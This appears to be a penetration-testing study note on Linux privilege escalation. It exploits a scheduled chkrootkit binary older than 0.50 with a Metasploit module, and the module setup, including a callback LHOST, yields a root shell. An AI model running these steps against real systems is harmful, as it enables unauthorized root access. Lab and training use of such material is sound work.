# Exploiting a Vulnerable Program/Service

- One method of escalating Linux privileges is by exploiting an existing vulnerable program on the target.
- In our case if we check the running programs using `ps aux` command. 
- The system executes a program called `chkrootkit`  every 60 seconds.
- The versions before `chkrootkit 0.50` are vulnerable to Local Privilege Escalation  
```
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /usr/local/bin/chkrootkit
set LHOST 192.177.124.2
exploit
```

This exploit runs and spawns a ROOT shell!!
